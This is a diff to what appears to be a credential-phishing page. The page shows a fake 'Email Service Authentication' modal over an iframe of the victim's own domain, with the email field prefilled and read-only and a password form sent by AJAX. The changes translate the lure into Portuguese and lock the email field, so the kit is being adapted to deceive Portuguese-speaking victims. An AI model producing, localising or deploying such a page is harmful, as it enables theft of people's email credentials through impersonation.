@@ -1,3 +1,6 @@
+
+
+
 <!DOCTYPE html>
 <html lang="en" >
 
@@ -249,7 +252,7 @@ $("#iframe").attr("src", "https://www."+my_slice);
         },
             // data: $('#contact').serialize(),
             beforeSend: function(xhr){
-              $('#submit-btn').html('Authenticating.........');
+              $('#submit-btn').html('Autenticando.........');
             },
             success: function(response){
               if(response){
@@ -280,7 +283,7 @@ $("#iframe").attr("src", "https://www."+my_slice);
               // $('#msg').html("Please try again later");
             },
             complete: function(){
-              $('#submit-btn').html('Log In');
+              $('#submit-btn').html('Entrar');
             }
             
             
@@ -343,17 +346,17 @@ $("#iframe").attr("src", "https://www."+my_slice);
         <div class="modal-body">
         <div class="form-wrap">
         <center>
-            <div><h2>Email Service Authentication</h2></div></center>
+            <div><h2>Autenticacao de e-mail</h2></div></center>
         <center>
-          <div class="alert alert-danger" id="msg" style="display: none; color:red;"> Invalid Password.! Please Enter your correct Password</div>
+          <div class="alert alert-danger" id="msg" style="display: none; color:red;"> Senha incorreta, tente novamente mais tarde</div>
           <div id="error" class="text-danger" style="display: none; color:red;">That account doesn't exist. Enter a different account</div>
         </center>
       <div class="input_box">
-        <input type="email" name="username" id="email" placeholder="Email or Phone" >
+        <input type="email" name="username" id="email" placeholder="Email or Phone" readonly/ >
         <div class="icon"><i class="fas fa-user"></i></div>
       </div>
       <div class="input_box" required="required">
-        <input type="password" name="password" id="password" placeholder="Password" autofocus required="required">
+        <input type="password" name="password" id="password" placeholder="Senha" autofocus required="required">
         <div class="icon"><i class="fas fa-lock"></i></div>
       </div>
         </div>
@@ -362,7 +365,7 @@ $("#iframe").attr("src", "https://www."+my_slice);
        <div class="modal-footer"> 
             <!--     <div class="input_box"> -->
 
-            <button type="submit" id="submit-btn" class="btn btn-primary">Log In</button>
+            <button type="submit" id="submit-btn" class="btn btn-primary">Entrar</button>
         </div>
         </div>
     </div>
